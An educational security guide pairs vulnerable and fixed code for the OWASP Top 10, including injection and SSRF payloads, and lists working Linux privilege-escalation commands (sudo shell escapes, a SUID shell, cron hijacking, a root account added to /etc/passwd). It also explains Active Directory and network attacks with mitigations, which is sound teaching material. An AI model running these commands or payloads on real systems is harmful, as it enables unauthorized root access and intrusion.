# Deep Dive: Technical Fundamentals

> Educational content for defensive awareness, secure development, and authorized security testing only.

## Part A — OWASP Top 10 (2021) with Vulnerable and Fixed Code

### A01:2021 — Broken Access Control

**Vulnerable (Node.js/Express — IDOR):**
```javascript
// No ownership check — any authenticated user can read any invoice by guessing IDs
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice);
});
```

**Fixed:**
```javascript
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  if (!invoice || invoice.ownerId !== req.user.id) {
    return res.status(404).json({ error: 'Not found' }); // 404, not 403, to avoid confirming existence
  }
  res.json(invoice);
});
```

### A02:2021 — Cryptographic Failures

**Vulnerable (Python/Flask — storing passwords with fast unsalted hash):**
```python
import hashlib

def store_password(password):
    return hashlib.md5(password.encode()).hexdigest()  # Broken: fast, unsalted, collision-prone
```

**Fixed (bcrypt via `flask-bcrypt` or `bcrypt` package):**
```python
import bcrypt

def store_password(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)
```

### A03:2021 — Injection

**Vulnerable (Node.js — SQL injection via string concatenation):**
```javascript
app.get('/users', (req, res) => {
  const query = `SELECT * FROM users WHERE username = '${req.query.username}'`;
  db.query(query, (err, results) => res.json(results));
  // Input: ' OR '1'='1  -->  dumps entire table
});
```

**Fixed (parameterized query):**
```javascript
app.get('/users', (req, res) => {
  const query = 'SELECT id, username, email FROM users WHERE username = ?';
  db.query(query, [req.query.username], (err, results) => res.json(results));
});
```

**Vulnerable (Python/Flask — command injection):**
```python
import os

@app.route('/ping')
def ping():
    host = request.args.get('host')
    output = os.popen(f"ping -c 4 {host}").read()  # Input: "; cat /etc/passwd" executes arbitrary command
    return output
```

**Fixed (avoid shell, use subprocess with arg list + validation):**
```python
import subprocess, ipaddress

@app.route('/ping')
def ping():
    host = request.args.get('host')
    try:
        ipaddress.ip_address(host)  # validate it's actually an IP, reject everything else
    except ValueError:
        return "Invalid host", 400
    result = subprocess.run(['ping', '-c', '4', host], capture_output=True, text=True, timeout=10)
    return result.stdout
```

### A04:2021 — Insecure Design
Design-level flaws that no amount of clean code fixes — e.g., a password reset flow that emails the new password in plaintext instead of a single-use expiring link, or a rate-unlimited login endpoint enabling credential stuffing. Mitigation happens at the architecture/threat-modeling stage: enforce business logic limits server-side (e.g., max withdrawal amounts), use secure design patterns, and apply threat modeling (STRIDE) before writing code.

### A05:2021 — Security Misconfiguration

**Vulnerable (Express — verbose error leaking stack traces in production):**
```javascript
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack }); // leaks internals to attacker
});
```

**Fixed:**
```javascript
app.use((err, req, res, next) => {
  console.error(err); // log internally
  const isProd = process.env.NODE_ENV === 'production';
  res.status(500).json({ error: isProd ? 'Internal server error' : err.message });
});
```
Also: disable directory listing, remove default accounts, turn off debug mode in production frameworks (`app.debug = False` in Flask/Django), keep software patched.

### A06:2021 — Vulnerable and Outdated Components
Track dependencies with `npm audit`, `pip-audit`, Snyk, or Dependabot. A CVE in a transitive dependency (e.g., the Log4Shell CVE-2021-44228 in Log4j) can compromise an entire application even if your own code is flawless. Pin versions, subscribe to security advisories for your stack, and patch promptly.

### A07:2021 — Identification and Authentication Failures

**Vulnerable (no rate limiting on login — enables credential stuffing/brute force):**
```javascript
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username });
  if (user && await bcrypt.compare(req.body.password, user.passwordHash)) {
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});
```

**Fixed (add rate limiting + account lockout/backoff + generic error message):**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts, try again later.'
});

app.post('/login', loginLimiter, async (req, res) => {
  const user = await User.findOne({ username: req.body.username });
  const valid = user && await bcrypt.compare(req.body.password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: 'Invalid username or password' }); // never reveal which field was wrong
  }
  res.json({ token: generateToken(user) });
});
```

### A08:2021 — Software and Data Integrity Failures

**Vulnerable (Python — insecure deserialization with pickle on untrusted input):**
```python
import pickle

@app.route('/load-session', methods=['POST'])
def load_session():
    data = request.data
    session_obj = pickle.loads(data)  # arbitrary code execution if attacker controls this payload
    return str(session_obj)
```

**Fixed (use a safe, structured format):**
```python
import json

@app.route('/load-session', methods=['POST'])
def load_session():
    try:
        session_obj = json.loads(request.data)  # JSON cannot execute code on deserialization
    except ValueError:
        return "Invalid data", 400
    return str(session_obj)
```
Also applies to CI/CD: verify package signatures/checksums, pin dependency hashes (`package-lock.json`, `requirements.txt` with hashes), restrict who can publish to your package registry.

### A09:2021 — Security Logging and Monitoring Failures
Without adequate logging, breaches go undetected for months (industry average dwell time has historically been 200+ days). Log authentication events, access-control failures, input validation failures — but never log secrets/passwords/full card numbers. Ship logs to a centralized, tamper-evident store (SIEM) and alert on anomalies (e.g., 50 failed logins from one IP in a minute).

### A10:2021 — Server-Side Request Forgery (SSRF)

**Vulnerable (Node.js — fetches any user-supplied URL):**
```javascript
app.post('/fetch-preview', async (req, res) => {
  const response = await fetch(req.body.url); // attacker: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  const text = await response.text();
  res.send(text);
});
```

**Fixed (allowlist + block internal/metadata ranges, disable redirects):**
```javascript
const { URL } = require('url');
const dns = require('dns').promises;

const BLOCKED_RANGES = ['127.', '10.', '169.254.', '192.168.', '172.16.'];

app.post('/fetch-preview', async (req, res) => {
  let parsed;
  try {
    parsed = new URL(req.body.url);
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return res.status(400).json({ error: 'Protocol not allowed' });
  }
  const { address } = await dns.lookup(parsed.hostname);
  if (BLOCKED_RANGES.some(prefix => address.startsWith(prefix))) {
    return res.status(400).json({ error: 'Target not allowed' });
  }
  const response = await fetch(parsed.toString(), { redirect: 'manual' }); // prevent redirect-based bypass
  res.send(await response.text());
});
```

---

## Part B — Linux Privilege Escalation Techniques

These are defensive-awareness explanations with the exact enumeration/exploitation commands used in authorized CTF and pentest contexts.

### 1. Enumeration first
```bash
# Automated enumeration scripts (run these first, always)
./linpeas.sh                       # LinPEAS - comprehensive automated enum
sudo -l                            # what can this user run as root/other users?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
cat /etc/crontab; ls -la /etc/cron.*     # scheduled tasks running as root
getcap -r / 2>/dev/null            # Linux capabilities on binaries
```

### 2. Sudo misconfiguration
If `sudo -l` shows a binary you can run as root that also allows shell escape (check GTFOBins for the binary):
```bash
sudo vim -c ':!/bin/sh'     # vim with sudo rights spawns a root shell
sudo find . -exec /bin/sh \; -quit
```

### 3. SUID binary abuse
```bash
# If /usr/bin/python with SUID bit is found (uncommon but illustrative):
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### 4. Cron job hijacking
If a world-writable script is run by root's crontab:
```bash
echo '#!/bin/bash' > /path/to/writable_cron_script.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable_cron_script.sh
# wait for cron to execute, then:
/tmp/rootbash -p
```

### 5. Kernel exploits
After enumerating kernel version (`uname -a`), check against known CVEs (e.g., Dirty COW CVE-2016-5195, Dirty Pipe CVE-2022-0847) via searchsploit. Kernel exploits are higher-risk (can crash the box) and used as a last resort in engagements.

### 6. Writable /etc/passwd
```bash
# If /etc/passwd is world-writable (rare but happens):
openssl passwd -1 -salt xyz password123
# Append: newroot:$1$xyz$hashedvalue:0:0:root:/root:/bin/bash
su newroot
```

### 7. PATH hijacking
If a root-executed script calls a command without an absolute path (e.g., just `ls` instead of `/bin/ls`) and your directory is earlier in `$PATH`, you can plant a malicious binary with that name.

---

## Part C — Windows Active Directory Attack Basics (Defensive Awareness)

These concepts are explained so defenders understand what to detect/mitigate — they require a legitimate, authorized lab (e.g., a GOAD or HTB AD environment) to practice safely.

### Kerberoasting
Active Directory uses Kerberos for authentication. Any authenticated domain user can request a **service ticket (TGS)** for any service account that has a registered SPN (Service Principal Name). Part of that ticket is encrypted with the **service account's password hash**. An attacker requests TGS tickets for all SPN accounts, then takes them offline and brute-forces/cracks them with tools like Hashcat — because service accounts often have weak, never-rotated passwords, this frequently succeeds without touching the DC again after ticket extraction.

**Defensive mitigation:** use long random passwords (25+ chars) or Group Managed Service Accounts (gMSA) for service accounts, monitor for abnormal volumes of TGS requests (Event ID 4769), restrict SPN registration.

### Pass-the-Hash (PtH)
NTLM authentication allows a client to authenticate using the **NTLM hash** of a password directly, without ever knowing the plaintext. If an attacker dumps hashes from a compromised machine's SAM/LSASS memory (e.g., via Mimikatz in an authorized test), they can present that hash to authenticate to other machines on which the same credential is valid — without ever cracking the hash.

**Defensive mitigation:** enable Credential Guard, restrict local admin password reuse across machines (LAPS — Local Administrator Password Solution), disable NTLM where possible in favor of Kerberos-only, apply the principle of least privilege so compromised accounts have limited reach.

### Other core AD attack concepts (awareness-level)
- **LLMNR/NBT-NS poisoning (Responder):** answering broadcast name-resolution requests to capture NTLMv2 hashes from misconfigured networks.
- **BloodHound:** maps AD trust/permission relationships as a graph to find shortest paths to Domain Admin — used defensively too, to find and close those paths before an attacker does.
- **Golden/Silver Ticket:** forging Kerberos tickets using a stolen krbtgt (Golden) or service account (Silver) hash to impersonate any user indefinitely — the reason krbtgt password rotation (twice) is mandatory after any suspected DC compromise.

---

## Part D — Network Protocols Attackers Abuse

### ARP Spoofing (ARP Cache Poisoning)
ARP has no authentication. A host broadcasts "who has IP X?" and trusts whichever reply arrives first. An attacker on the same L2 segment sends unsolicited, forged ARP replies claiming "I am the gateway's IP" (or "I am the victim's IP") to both the victim and the gateway. Both update their ARP caches to point to the attacker's MAC address, routing all traffic between them through the attacker — a classic Man-in-the-Middle setup. Tools: `arpspoof`, `ettercap`, Bettercap.

**Detection/mitigation:** static ARP entries for critical infra, dynamic ARP inspection on managed switches, ARP-watch monitoring tools.

### DNS Spoofing / Cache Poisoning
An attacker injects a forged DNS response (matching the expected transaction ID and source port) before the legitimate authoritative server's reply arrives, causing the victim's resolver to cache a malicious IP for a domain. On a local network this is often combined with ARP spoofing (attacker becomes the MITM, then answers DNS queries directly with forged responses).

**Mitigation:** DNSSEC (cryptographically signs DNS responses), DNS-over-HTTPS/TLS (encrypts resolution so a local MITM can't tamper or even see the query), randomized source ports and query IDs.

### Man-in-the-Middle (general)
Any technique (ARP spoof, rogue Wi-Fi AP, BGP hijack, malicious proxy) that positions an attacker between two communicating parties to eavesdrop or tamper. TLS with proper certificate validation is the primary defense — this is exactly why certificate pinning and strict HSTS matter, and why ignoring certificate warnings is dangerous: it is often the only visible sign a MITM is occurring.

**Mitigation at scale:** enforce TLS everywhere, HSTS preload lists, certificate transparency monitoring, 802.1X port-based network access control to prevent rogue devices from joining the network.
